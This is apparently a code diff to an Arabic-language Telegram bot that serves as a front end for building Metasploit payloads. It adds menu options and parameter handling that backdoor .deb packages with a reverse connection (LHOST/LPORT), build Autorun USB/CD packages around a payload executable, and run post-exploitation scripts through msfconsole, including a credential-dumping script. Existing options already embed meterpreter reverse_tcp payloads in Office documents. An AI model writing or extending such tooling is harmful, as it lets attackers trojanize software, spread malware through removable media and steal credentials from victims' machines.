@@ -55,6 +55,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("Android APK", callback_data="kind:android")],
         [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
         [InlineKeyboardButton("مستند Office", callback_data="kind:office")],
+        [InlineKeyboardButton("حزمة .deb", callback_data="kind:deb")],
+        [InlineKeyboardButton("حزمة Autorun", callback_data="kind:autorun")],
+        [InlineKeyboardButton("ما بعد الاستغلال", callback_data="kind:postex")],
     ]
     intro = (
         "اختر نوع المهمة:\n"
@@ -130,6 +133,29 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "مثال: ms_word_windows 127.0.0.1 4444 invoice\n"
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "deb":
+        txt = (
+            "تلغيم حزمة .deb.\n"
+            "أرسل: DEB_PATH LHOST LPORT OUTPUT_NAME\n"
+            "مثال: /path/app.deb 127.0.0.1 4444 mydeb\n"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "autorun":
+        txt = (
+            "حزمة Autorun لوسائط USB/CD.\n"
+            "أرسل: [EXE_PATH] [EXE_NAME]\n"
+            "مثال مع ملفك: /path/payload.exe myapp.exe\n"
+            "أو ارسل سطر فارغ لاستخدام الملف الافتراضي app4.\n"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "postex":
+        txt = (
+            "تشغيل سكربت ما بعد الاستغلال (rc) عبر msfconsole.\n"
+            "أرسل: SCRIPT_NAME [SESSION_ID]\n"
+            "أمثلة السكربتات المتوفرة: sysinfo.rc, fast_migrate.rc, cred_dump.rc, gather.rc\n"
+            "مثال: sysinfo.rc 1\n"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
     else:
         await query.edit_message_text("خيار غير مدعوم")
         return ConversationHandler.END
@@ -184,6 +210,29 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
         sess.kind = "office"
+    elif sess.kind == "deb":
+        if len(parts) < 4:
+            await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
+            return PARAMS
+        deb_path, lhost, lport, output_name = parts[:4]
+        sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
+        sess.kind = "deb"
+    elif sess.kind == "autorun":
+        # both params optional; support empty line
+        exe_path = parts[0] if len(parts) >= 1 else ""
+        exe_name = parts[1] if len(parts) >= 2 else "app4.exe"
+        sess.params = {"exe_path": exe_path, "exe_name": exe_name}
+        sess.kind = "autorun"
+    elif sess.kind == "postex":
+        if len(parts) < 1:
+            await update.message.reply_text("الاستخدام: SCRIPT_NAME [SESSION_ID]\nأمثلة: sysinfo.rc أو sysinfo.rc 1")
+            return PARAMS
+        script_name = parts[0]
+        session_id = parts[1] if len(parts) >= 2 else ""
+        sess.params = {"script_name": script_name}
+        if session_id:
+            sess.params["session_id"] = session_id
+        sess.kind = "postex"
     else:
         await update.message.reply_text("خيار غير مدعوم")
         return ConversationHandler.END
